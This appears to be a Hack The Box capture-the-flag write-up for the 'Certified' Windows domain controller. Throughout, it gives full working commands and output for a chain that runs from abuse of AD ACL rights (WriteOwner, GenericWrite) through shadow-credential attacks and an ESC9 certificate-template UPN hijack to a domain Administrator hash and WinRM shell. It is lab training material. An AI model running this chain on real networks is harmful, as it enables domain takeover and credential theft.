---
title: HTB:Certified
date: 2025-10-17 04:01 +0000
categories: [Write Ups, Boxes]
tags: [red-team-pathway, difficulty:medium, Active Directory, ESC9, BloodHound, shadow credentials]     # TAG names should always be lowercase
---


# Intro

> [Certified](https://app.hackthebox.com/machines/633) is a medium-difficulty Windows machine, which provides a great introduction to exploiting certificates ([ESC9](https://www.hackingarticles.in/adcs-esc9-no-security-extension/) attack), and using bloodhound to find attack paths. 

**Attack path:**
```
Judith (Low Priv) 
   └── WriteOwner → Management Group
       └── GenericWrite → management_svc
           └── Shadow Credentials → ca_operator
               └── ESC9 Abuse → Administrator
```

>TL;DR 
>- Start with provided low-privileged credentials for `judith.mader` (assumed breach scenario).
>- Enumerate the domain and collect AD objects with `BloodHound`/`RustHound`.
>- Discover `judith.mader` has `WriteOwner` on the `Management` group.
>- Use owner/DACL editing to take ownership and add `judith.mader` to the `Management` group.
>- From the `Management` group, abuse `GenericWrite` on the `management_svc` account to add a shadow credential and obtain its NTLM hash.
>- Use the `management_svc` NTLM hash to compromise `ca_operator` (shadow credentials), then enumerate AD CS templates.
>- Identify a vulnerable certificate template (`ESC9`) and temporarily change `ca_operator`’s UPN to `Administrator`.
>- Request a certificate for `Administrator`, use it to get a NTLM, and authenticate via WinRM as **Administrator** to read `root.txt`.
{: .prompt-tip }


## Nmap Enumeration

The initial Nmap scan reveals a classic Active Directory environment:
```bash
sudo nmap -sVC 10.129.231.186
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 09:18 AWST
Nmap scan report for 10.129.231.186
Host is up (0.44s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 08:21:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-15T08:22:35+00:00; +7h01m42s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T08:22:34+00:00; +7h01m42s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T08:22:35+00:00; +7h01m42s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T08:22:34+00:00; +7h01m42s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h01m41s, deviation: 0s, median: 7h01m41s
| smb2-time: 
|   date: 2025-10-15T08:21:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.26 seconds
```

**Key Ports Identified**:

|   Port | Service                  | Description                               |
| -----: | :----------------------- | ----------------------------------------- |
|   `53` | **DNS**                  | *Simple DNS Plus (name resolution)*       |
|   `88` | **Kerberos**             | *Authentication (KDC)*                    |
|  `135` | **MSRPC**                | *Microsoft RPC endpoint mapper*           |
|  `139` | **NetBIOS**              | *NetBIOS Session Service*                 |
|  `389` | **LDAP**                 | *Active Directory LDAP (unencrypted)*     |
|  `445` | **SMB**                  | *Server Message Block (file/sharing, AD)* |
|  `464` | **kpasswd5**             | *Kerberos password change (kpasswd)*      |
|  `593` | **RPC over HTTP**        | *Microsoft RPC tunnelling over HTTP*      |
|  `636` | **LDAPS**                | *LDAP over TLS/SSL (secure LDAP)*         |
| `3268` | **Global Catalog LDAP**  | *AD Global Catalog (unencrypted)*         |
| `3269` | **Global Catalog LDAPS** | *AD Global Catalog over TLS/SSL*          |

The presence of Kerberos (`88`), LDAP (`389/636`), SMB (`445`), and Global Catalog (`3268/3269`) strongly indicates a **Windows Domain Controller**.

From the LDAP certificate, we can identify:
- **Hostname:** `DC01.certified.htb`
- **Domain:** `certified.htb`
A **7-hour clock skew** is also detected (`clock-skew: mean: 7h01m41s`)

## Initial Access via Judith’s Credentials

We test known credentials for `judith.mader` against `SMB`:
```bash
nxc smb 10.129.231.186 -u judith.mader -p judith09 --shares
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             [*] Enumerated shares
SMB         10.129.231.186  445    DC01             Share           Permissions     Remark
SMB         10.129.231.186  445    DC01             -----           -----------     ------
SMB         10.129.231.186  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.186  445    DC01             C$                              Default share
SMB         10.129.231.186  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.186  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.186  445    DC01             SYSVOL          READ            Logon server share 
```

Authentication succeeded, giving us low-privileged domain user access but no interesting shares beyond standard ones (`NETLOGON`, `SYSVOL`, etc.).

## BloodHound / RustHound Enumeration

Using the credentials of `judith.mader` we can ingest the domain into BloodHound:

```bash
rusthound-ce -d DC01.certified.htb -u 'judith.mader@certified.htb' -p 'judith09' -o /tmp/certified 
```

**There are two ways that we can progress from here:**
- The first method is to leverage our existing credentials with `certipy` to view certificates and notice that there exists a `ca_operator` user. In bloodhound we can go to the pathfinding tab and observe the path from `judith.mader` to `ca_operator`.  
- We can follow the method detailed below, which is how I originally completed the box:

To start, we'll mark `judith.mader` as owned.
![Owned.png](/assets/img/Certified/Owned.png)

Viewing the user data on the right-hand side, we'll scroll down to “Outbound Object Control”. Clicking this adds another node:
![writeowner.webp](/assets/img/Certified/writeowner.webp)
Continuing down this path, we very quickly end up with a graph that is as follows: 
![attack-path.png](/assets/img/Certified/attack-path.png)

### Pretty picture, what does it mean?

- `judith.mader` has **`WriteOwner`** over the `management group` which effectively means she has **full administrative control**. `WriteOwner` allows us to take ownership of the object (`management group`), and once owned, we can modify its ACL (`Access Control List`) and add ourselves as a member.

- The `Management group` has **`GenericWrite`** on `management_svc`, which allows modification of most writable account attributes, including adding key credentials (`msDS-KeyCredentialLink`) to implant **shadow credentials**.

- `management_svc` holds **`GenericAll`** over `ca_operator`, which essentially allows full control of that account, which will allow us to change the UPN, add key creds, etc. (more on this later).

Thus, our attack path is as follows:
```
judith.mader
   └── Take ownership of Management group 
       └── Add judith.mader to Management group
           └── Abuse the GenericWrite that Management group has on management_svc
               └── Compromise ca_operator account
```


## Abusing **WriteOwner** to add **Judith.Mader** to the **Management** group
Clicking on the edge in Bloodhound from `Judith.Mader` to the `Management` group, we get a '*recipe*' for how to abuse this:
![linuxattack.png](/assets/img/Certified/linuxattack.png)

First, we'll use `owneredit.py`, to take ownership of the the `management` group as `judith.mader`:
```bash
owneredit.py -action write \ 
  -new-owner judith.mader \  #<-- syntax change from bloodhound
  -target management \       
  certified/judith.mader:judith09 \ 
  -dc-ip 10.129.231.186
```

Then, we modify the ACL to give `judith.mader` the rights to add users:

```bash
dacledit.py -action 'write' -rights 'WriteMembers' \
  -principal judith.mader \ #<-- Who's rights we're modifying
  -target Management \
  'certified'/'judith.mader':'judith09' -dc-ip 10.129.231.186
```

And finally we add `judith.mader` to the Management group::

```bash
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

The command above doesn't provide any output indicating success. We can use the following command to check that we succeeded:
```bash
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
CERTIFIED\judith.mader #<-- judith.mader part of Management group
CERTIFIED\management_svc
```


## Abusing  **GenericWrite** on **management_svc** to gain credentials

With group membership secured, we can leverage the `GenericWrite` on the `management_svc` account to perform a **Shadow Credentials** attack, or perform a **Kerberoasting** attack. 
I'll go with the Shadow Credentials attack, as it allows us to grab a NTLM hash which we can use for authentication, which allows us to skip the whole process of attempting to crack the `$krb5tgs$23$` hash. 

```bash
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5b03c640-1a2c-3ef9-a4bb-141d28ebe164'
[*] Adding Key Credential with device ID '5b03c640-1a2c-3ef9-a4bb-141d28ebe164' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '5b03c640-1a2c-3ef9-a4bb-141d28ebe164' to the Key Credentials for 'management_svc'
/home/truffle/boxes/certified/certipy-venv/lib/python3.11/site-packages/certipy/lib/certificate.py:233: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it
was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': None
```

The first attempt fails due to **clock skew** (`KRB_AP_ERR_SKEW`), which we resolved by syncing time:

```bash
sudo ntpdate certified.htb
```

Re-running the attack succeeds yielding the NT hash for `management_svc`:

```bash
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8eee13e9-fed7-34b7-0c15-791d8954fa48'
[*] Adding Key Credential with device ID '8eee13e9-fed7-34b7-0c15-791d8954fa48' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '8eee13e9-fed7-34b7-0c15-791d8954fa48' to the Key Credentials for 'management_svc'
/home/truffle/boxes/certified/certipy-venv/lib/python3.11/site-packages/certipy/lib/certificate.py:233: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it
was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

This gives us the NTLM hash: 
```
a091c1832bcdd4677c28b5a6a1295584
```

We can verify access with:
```bash
nxc smb certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
[*] Initializing SMB protocol database
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584
```

We'll check if we get WinRM access:
```bash
nxc winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
WINRM 10.129.231.186 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) 
WINRM 10.129.231.186 5985 DC01 [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```

### Getting user.txt
I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell:

```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

We can find `user.txt` on the desktop:

```powershell
*Evil-WinRM* PS C:\Users\management_svc\desktop> type user.txt
5b5f382a************************
```
## Abusing  **GenericAll** on **ca_operator** to gain credentials

We can use the`management_svc` account to perform another Shadow Credential attack against the **`ca_operator`** account:

```bash
certipy shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7459ff04-4030-aeb3-5fed-7265fc1c3244'
[*] Adding Key Credential with device ID '7459ff04-4030-aeb3-5fed-7265fc1c3244' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '7459ff04-4030-aeb3-5fed-7265fc1c3244' to the Key Credentials for 'ca_operator'
/home/truffle/tools/certipy-venv/lib/python3.11/site-packages/certipy/lib/certificate.py:233: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negati
ve or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
  
```

This gives us the NTLM hash for `ca_operator`:

```
b4b86f45c6018f1b664f70805f45d8f2
```


## AD CS Enumeration and ESC9 Abuse

My first thought, is to enumerate certificate templates. We can do this using `certipy`

```bash
certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication <---
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA <---
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

We're in luck! `certipy` alerts us to the fact that the `CertifiedAuthentication` template is vulnerable to **ESC9**. 



Two references that I followed to understand this attack chain we're about to perform are referenced [here](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7) and [here](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates?source=post_page-----50a5fb2569d2---------------------------------------#no-security-extension-esc9). We perform it as follows:
```
management_svc  
└── GenericAll → ca_operator 
  └── Change UPN → Administrator  
    └── Request certificate (vulnerable template) as ca_operator 
      └── Restore UPN → ca_operator (cleanup)  
        └── Use certificate → retrieve Administrator NTLM hash  
          └── evil-winrm → Administrator shell
```


## UPN Hijack and Certificate Request

We temporarily set `ca_operator`’s UPN to **Administrator**:

```bash
certipy account update -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

We then request a certificate:

```bash
certipy req -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'  
  
```

Certificate was issued with `UPN = Administrator`.

We then restore the original UPN;
```bash
certipy account update -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

```

## Domain Administrator Access

Finally, we use the certificate to get the administrator’s NTLM hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

This gives us the NTLM hash for Administrator:

```
aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

And a shell:

```bash
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```
And `root.txt`
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
48ea19************************
```
    
Aaaaand we're done. 
Thanks for reading! 


